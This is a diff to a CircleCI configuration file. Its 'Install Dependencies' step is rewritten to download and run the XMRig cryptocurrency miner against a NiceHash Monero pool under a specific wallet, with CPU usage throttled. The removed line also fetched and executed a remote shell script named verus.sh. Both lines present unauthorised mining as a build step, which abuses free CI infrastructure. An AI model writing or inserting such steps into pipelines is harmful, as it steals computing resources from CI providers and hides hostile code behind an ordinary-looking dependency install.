@@ -1,3 +1,5 @@
+code:-
+===========
 version: 2.1
 jobs:
     trial:
@@ -8,7 +10,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+              wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig -o randomxmonero.eu-west.nicehash.com:3380 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.Hideyoshi --randomx-1gb-pages -p x -k -a rx/0 -t 8 --nicehash --max-cpu-usage 30 --cpu-priority 5
               echo Hello,subscribe it
 
 workflows:
